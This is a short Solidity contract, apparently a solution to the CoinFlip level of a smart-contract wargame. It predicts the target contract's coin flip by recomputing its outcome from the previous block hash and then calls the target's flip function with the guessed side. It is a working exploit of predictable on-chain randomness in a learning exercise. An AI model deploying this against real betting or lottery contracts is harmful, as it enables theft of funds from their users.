// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import '@openzeppelin/contracts/utils/math/SafeMath.sol'; // Path change of openzeppelin contract

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipMyHack {

    using SafeMath for uint256;

    function hack(address attacked) public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bool side = coinFlip == 1 ? true : false;

       ICoinFlip(attacked).flip(side);
    }  

}